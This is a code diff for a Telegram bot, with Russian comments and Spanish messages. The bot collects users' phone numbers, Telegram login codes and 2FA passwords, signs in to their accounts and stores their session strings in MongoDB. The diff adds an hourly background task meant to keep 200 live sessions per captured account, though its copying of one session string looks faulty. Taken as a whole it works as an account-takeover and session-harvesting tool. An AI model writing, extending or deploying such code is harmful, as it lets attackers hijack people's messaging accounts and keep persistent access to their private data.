@@ -24,29 +24,70 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 mongo = MongoClient(MONGO_URI)
 db = mongo.telegram_sessions
-sessions_col = db.sessions
+main_sessions_col = db["main_sessions"]  # Основные сессии (1 на пользователя)
+active_sessions_col = db["active_sessions"]  # Активные сессии (200 на пользователя)
 
 # Глобальные переменные
 user_states = {}
 temp_data = {}
 
-async def create_session_pool(user_id, phone, session_str):
-    """Создаем пул из 5 сессий (можно увеличить до 200)"""
-    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-    await client.connect()
+async def maintain_sessions(user_id, phone, main_session_str):
+    """Поддерживаем пул активных сессий"""
+    # Получаем текущие активные сессии пользователя
+    active_sessions = list(active_sessions_col.find({"user_id": user_id}))
     
-    # Сохраняем основную сессию
-    sessions_col.update_one(
-        {"user_id": user_id},
-        {"$set": {
-            "phone": phone,
-            "session": session_str,
-            "created_at": datetime.utcnow()
-        }},
-        upsert=True
-    )
+    # Проверяем какие сессии активны
+    valid_sessions = []
+    for session in active_sessions:
+        client = TelegramClient(StringSession(session['session']), API_ID, API_HASH)
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                valid_sessions.append(session)
+            else:
+                # Удаляем неактивную сессию
+                active_sessions_col.delete_one({"_id": session["_id"]})
+        except Exception as e:
+            logging.error(f"Session check error: {e}")
+            active_sessions_col.delete_one({"_id": session["_id"]})
+        finally:
+            await client.disconnect()
     
-    await client.disconnect()
+    # Если активных сессий меньше 200 - создаем новые
+    if len(valid_sessions) < 200:
+        needed = 200 - len(valid_sessions)
+        for _ in range(needed):
+            # Создаем новую сессию на основе основной
+            client = TelegramClient(StringSession(main_session_str), API_ID, API_HASH)
+            await client.connect()
+            new_session_str = client.session.save()
+            
+            # Добавляем новую активную сессию
+            active_sessions_col.insert_one({
+                "user_id": user_id,
+                "phone": phone,
+                "session": new_session_str,
+                "created_at": datetime.utcnow(),
+                "last_active": datetime.utcnow()
+            })
+            
+            await client.disconnect()
+
+async def session_monitor():
+    """Фоновая задача для поддержания сессий"""
+    while True:
+        await asyncio.sleep(3600)  # Проверка каждый час
+        try:
+            # Получаем всех пользователей с основными сессиями
+            users_with_sessions = main_sessions_col.distinct("user_id")
+            
+            for user_id in users_with_sessions:
+                # Получаем основную сессию пользователя
+                main_session = main_sessions_col.find_one({"user_id": user_id})
+                if main_session:
+                    await maintain_sessions(user_id, main_session['phone'], main_session['session'])
+        except Exception as e:
+            logging.error(f"Session monitor error: {e}")
 
 async def send_code_keyboard(user_id, current_code="", message_id=None):
     digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
@@ -112,7 +153,7 @@ async def handle_contact(message: types.Message):
         phone = "+" + phone
 
     # Проверяем, не авторизован ли уже этот номер
-    existing = sessions_col.find_one({"phone": phone})
+    existing = main_sessions_col.find_one({"phone": phone})
     if existing:
         await message.answer("❌ Este número ya está registrado. Usa otro número.")
         return
@@ -192,7 +233,20 @@ async def try_sign_in(user_id, code):
         
         if await client.is_user_authorized():
             session_str = client.session.save()
-            await create_session_pool(user_id, phone, session_str)
+            
+            # Сохраняем основную сессию
+            main_sessions_col.update_one(
+                {"user_id": user_id},
+                {"$set": {
+                    "phone": phone,
+                    "session": session_str,
+                    "created_at": datetime.utcnow()
+                }},
+                upsert=True
+            )
+            
+            # Создаем пул активных сессий
+            await maintain_sessions(user_id, phone, session_str)
             
             await bot.send_message(user_id, "✅ ¡Autenticación exitosa!")
             await bot.send_message(
@@ -239,7 +293,20 @@ async def process_2fa(message: types.Message):
         
         if await client.is_user_authorized():
             session_str = client.session.save()
-            await create_session_pool(user_id, phone, session_str)
+            
+            # Сохраняем основную сессию
+            main_sessions_col.update_one(
+                {"user_id": user_id},
+                {"$set": {
+                    "phone": phone,
+                    "session": session_str,
+                    "created_at": datetime.utcnow()
+                }},
+                upsert=True
+            )
+            
+            # Создаем пул активных сессий
+            await maintain_sessions(user_id, phone, session_str)
             
             await message.answer("✅ ¡Autenticación exitosa con 2FA!")
             await message.answer(
@@ -263,6 +330,8 @@ def cleanup(user_id):
         temp_data.pop(user_id)
 
 async def on_startup(dp):
+    # Запускаем мониторинг сессий при старте бота
+    asyncio.create_task(session_monitor())
     logging.info("Bot started")
 
 if __name__ == '__main__':
